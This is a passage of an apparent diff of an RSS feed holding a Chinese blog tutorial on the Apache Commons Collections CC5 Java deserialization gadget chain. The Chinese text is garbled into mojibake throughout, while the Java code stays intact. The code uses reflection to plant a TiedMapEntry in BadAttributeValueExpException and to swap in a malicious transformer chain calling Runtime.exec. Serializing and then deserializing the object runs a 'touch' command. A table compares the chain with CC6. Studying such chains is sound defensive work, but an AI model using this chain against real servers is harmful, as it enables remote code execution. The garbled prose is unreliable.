-}
-</code></pre>
-<p>å¦æç´æ¥å¨æé å½æ°ä¸­ä¼ å¥ <code>entry</code>ï¼é£ä¹æé å½æ°ä¼ç«å³è°ç¨ <code>entry.toString()</code>ï¼å¯¼è´å½ä»¤å¨æ»å»èæ¬å°æ§è¡ï¼èéå¨ç®æ æå¡å¨ååºååæ¶è§¦åï¼ãå æ­¤ï¼æä»¬åä¼ å¥ <code>null</code> å®æå¯¹è±¡å®ä¾åï¼ç¶åéè¿åå°å°ç§æå­æ®µ <code>val</code> ç´æ¥è®¾ç½®ä¸º <code>entry</code>ï¼ä»èç»è¿æé æ¹æ³çé»è¾ï¼å®ç°âå»¶è¿è§¦åâã</p>
-<p><strong>åå°æä½çä½ç¨</strong>ï¼<br>
-<code>getDeclaredField("val")</code> è·åç§æå­æ®µï¼<code>setAccessible(true)</code> ç¦ç¨ Java è¯­è¨è®¿é®æ§å¶ï¼<code>set()</code> ç´æ¥ä¿®æ¹å¯¹è±¡å åå­ä¸­çå­æ®µå¼ãè¿æ ·ï¼<code>valException</code> å¯¹è±¡åé¨å°±ææäº <code>entry</code>ï¼ä½å°æªè§¦åä»»ä½ <code>toString</code> è°ç¨ã</p>
-<h3 id="3æ¿æ¢å ä½é¾ä¸ºæ¶æé¾">3.æ¿æ¢å ä½é¾ä¸ºæ¶æé¾</h3>
-<pre><code class="language-java">// 6. å° transformerChain ä¸­ç iTransformers æ¿æ¢ä¸ºçæ­£çæ¶æé¾ï¼æ­¤æ¶æ"ä¸è"ï¼
-Field iTransformersField = ChainedTransformer.class.getDeclaredField("iTransformers");
-iTransformersField.setAccessible(true);
-iTransformersField.set(transformerChain, maliciousTransformers);
-</code></pre>
-<p>æ­¤æ¶ <code>transformerChain</code> åé¨åæ¬åªåå« <code>dummyTransformer</code>ï¼ç°å¨è¢«æ¿æ¢ä¸ºå®æ´ç <code>maliciousTransformers</code>ãç±äºæ¿æ¢æä½åçå¨åºååä¹åï¼ä¸ <code>LazyMap</code> å <code>TiedMapEntry</code> åªæ¯ææå¯¹ <code>transformerChain</code> çå¼ç¨ï¼æä»¥åºååæ¶ä¼å°ä¿®æ¹åçåå®¹ä¸å¹¶åå¥ã</p>
-<h3 id="4-åºååä¸ååºååè§¦å">4. åºååä¸ååºååè§¦å</h3>
-<pre><code class="language-java">// 7. åºåå valException
-ByteArrayOutputStream baos = new ByteArrayOutputStream();
-ObjectOutputStream oos = new ObjectOutputStream(baos);
-oos.writeObject(valException);
-
-// 8. ååºåå ââ èªå¨è§¦åå½ä»¤æ§è¡
-ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
-ObjectInputStream ois = new ObjectInputStream(bais);
-ois.readObject();   // æ¼æ´è§¦åç¹
-</code></pre>
-<p>å½ <code>ois.readObject()</code> æ§è¡æ¶ï¼<code>BadAttributeValueExpException</code> ç <code>readObject</code> æ¹æ³è¢«è°ç¨ï¼åé¨ä¼æ§è¡ <code>val.toString()</code>ãæ­¤æ¶ <code>val</code> æå <code>entry</code>ï¼å³ <code>TiedMapEntry</code> å¯¹è±¡ï¼ï¼å æ­¤è°ç¨ <code>entry.toString()</code>ã</p>
-<ul>
-<li><code>TiedMapEntry.toString()</code> ä¼è°ç¨ <code>getKey() + "=" + getValue()</code>ã</li>
-<li><code>getValue()</code> è¿å <code>map.get(key)</code>ï¼å³ <code>lazyMap.get("foo")</code>ã</li>
-<li>ç±äº <code>"foo"</code> å¨ <code>innerMap</code> ä¸­ä¸å­å¨ï¼<code>LazyMap.get()</code> è°ç¨ <code>factory.transform("foo")</code>ï¼è¿éç <code>factory</code> æ¯ <code>transformerChain</code>ï¼å®å·²è¢«æ¿æ¢ä¸ºæ¶æé¾ã</li>
-<li>æ¶æé¾ä¾æ¬¡æ§è¡ï¼<code>ConstantTransformer(Runtime.class)</code> â <code>InvokerTransformer("getMethod", ...)</code> â <code>InvokerTransformer("invoke", ...)</code> â <code>InvokerTransformer("exec", ...)</code>ï¼æç»æ§è¡å½ä»¤ <code>touch /tmp/cc5_success</code>ã</li>
-</ul>
-<h3 id="5-cc5-ä¸-cc6-çåºå«">5. CC5 ä¸ CC6 çåºå«</h3>
-<table>
-<thead>
-<tr>
-<th style="text-align: left">å¯¹æ¯é¡¹</th>
-<th style="text-align: left"><strong>CC5</strong></th>
-<th style="text-align: left"><strong>CC6</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align: left"><strong>å¥å£ç±»</strong></td>
-<td style="text-align: left"><code>BadAttributeValueExpException</code></td>
-<td style="text-align: left"><code>HashSet</code> æ <code>HashMap</code></td>
-</tr>
-<tr>
-<td style="text-align: left"><strong>è§¦åæ¹æ³</strong></td>
-<td style="text-align: left"><code>readObject()</code> â <code>val.toString()</code></td>
-<td style="text-align: left"><code>readObject()</code> â <code>key.hashCode()</code></td>
-</tr>
-<tr>
-<td style="text-align: left"><strong>æ ¸å¿æºå¶</strong></td>
-<td style="text-align: left">å¼å¸¸å¯¹è±¡ååºååæ¶èªå¨è°ç¨æååéç <code>toString()</code></td>
-<td style="text-align: left">éåååºååæ¶èªå¨è®¡ç®åç´ ç <code>hashCode()</code></td>
-</tr>
-<tr>
-<td style="text-align: left"><strong>ä¼å¿</strong></td>
-<td style="text-align: left">ç´æ¥ãä¸ä¾èµéåç»æï¼ç»è¿ <code>AnnotationInvocationHandler</code> ä¿®å¤</td>
-<td style="text-align: left">éç¨èå´æ´å¹¿ï¼å¨æ´é« JDK çæ¬ä¸­ä¾ç¶ææï¼ééåå¶ä»æå·§ï¼</td>
-</tr>
-</tbody>
-</table>
-<p>ä¸¤èåä½¿ç¨ <code>LazyMap</code> + <code>TiedMapEntry</code> ä½ä¸ºæ¡¥æ¢ï¼åºå«ä»å¨äºè°å»è°ç¨ <code>TiedMapEntry</code> ç <code>toString()</code> æ <code>hashCode()</code>ãCC5 å©ç¨å¼å¸¸ç±»çç¹æ®ååºååè¡ä¸ºï¼CC6 åå©ç¨éåç±»çåå¸è®¡ç®é»è¾ã</p>
-
-
-</div>
-<div class="clear"></div>
-
-            </div>
-            <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0" data-date-updated="2026-05-16 12:53">2026-05-16 12:53</span>&nbsp;
-<a href="https://www.cnblogs.com/ThorneYe">ThorneYe</a>&nbsp;
-éè¯»(<span id="post_view_count">0</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
-&nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(20058667);return false;">æ¶è</a>&nbsp;
-<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2FThorneYe%2Fp%2F20058667&amp;targetId=20058667&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
-</div>
-         ]]>
     </description>
     </item>
         </channel>
